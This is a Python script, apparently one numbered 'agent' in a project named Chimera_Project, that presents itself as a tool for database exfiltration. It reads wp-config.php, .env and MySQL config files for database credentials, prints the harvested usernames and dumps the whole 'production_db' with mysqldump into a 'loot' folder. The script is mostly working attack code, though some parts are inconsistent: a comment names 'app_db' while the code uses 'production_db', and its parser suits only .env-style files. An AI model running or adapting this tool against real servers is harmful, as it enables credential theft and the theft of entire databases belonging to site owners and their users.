#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import json
import subprocess
from datetime import datetime

class DatabaseDiver:
    """
    Agent 309: Automated SQL Intelligence Extractor.
    Locates local database configurations and performs 
    automated schema and data dumping for exfiltration.
    """
    def __init__(self):
        self.loot_dir = "/home/dan/Chimera_Project/agents/309_Database_Diver/loot"
        os.makedirs(self.loot_dir, exist_ok=True)
        # Common config files where DB credentials hide
        self.config_targets = [
            "/var/www/html/wp-config.php",
            "/var/www/html/.env",
            "/etc/mysql/my.cnf",
            "~/.my.cnf"
        ]

    def _extract_creds_from_env(self, file_path):
        """Parses .env files for DB_USER and DB_PASSWORD."""
        creds = {}
        try:
            with open(os.path.expanduser(file_path), 'r') as f:
                for line in f:
                    if "DB_" in line and "=" in line:
                        key, val = line.strip().split('=', 1)
                        creds[key] = val
            return creds
        except Exception:
            return None

    def dump_mysql(self, user, password, db_name):
        """Uses mysqldump primitive to extract the entire database."""
        print(f"[*] Diverging into MySQL Database: {db_name}...")
        output_file = f"{self.loot_dir}/{db_name}_dump.sql"
        try:
            # -p is passed directly (High-fidelity, no prompts)
            cmd = ["mysqldump", f"-u{user}", f"-p{password}", db_name]
            with open(output_file, 'w') as f:
                subprocess.run(cmd, stdout=f, check=True)
            print(f"    [!!!] DATABASE DUMPED TO: {output_file}")
            return True
        except Exception as e:
            print(f"    [!] Dump Failed: {e}")
            return False

    def execute(self):
        print("--- [AGENT 309: DATABASE DIVER ACTIVE] ---")
        
        # 1. Credential Harvesting
        for target in self.config_targets:
            creds = self._extract_creds_from_env(target)
            if creds and "DB_PASSWORD" in creds:
                print(f"[+] Found Credentials in {target}: {creds.get('DB_USER')}")
                # 2. Attempt the Dump (Assumes default 'app_db' name for this primitive)
                self.dump_mysql(creds.get('DB_USER'), creds.get('DB_PASSWORD'), "production_db")

if __name__ == "__main__":
    DatabaseDiver().execute()
